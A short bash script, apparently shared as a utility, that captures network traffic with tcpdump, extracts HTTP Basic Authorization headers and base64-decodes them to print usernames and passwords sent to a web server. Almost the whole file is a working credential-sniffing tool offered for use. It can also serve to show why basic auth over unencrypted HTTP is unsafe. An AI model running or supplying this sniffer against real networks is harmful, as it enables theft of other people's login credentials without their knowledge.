#!/bin/bash

# grayman@zr0s.org
# Simple script to sniff login/passwords from a webserver serving up basic auth.  Only option is the ethernet device.

if [ "$1" == "" ]; then
	echo "Usage: $0 <ethernet_device>"
	exit 0
fi

tcpdump -i $1 -w - | strings | grep -i "Authorization: Basic" | awk '{print $3}'| while read i; do echo $i | base64 -d; echo ""  ; done
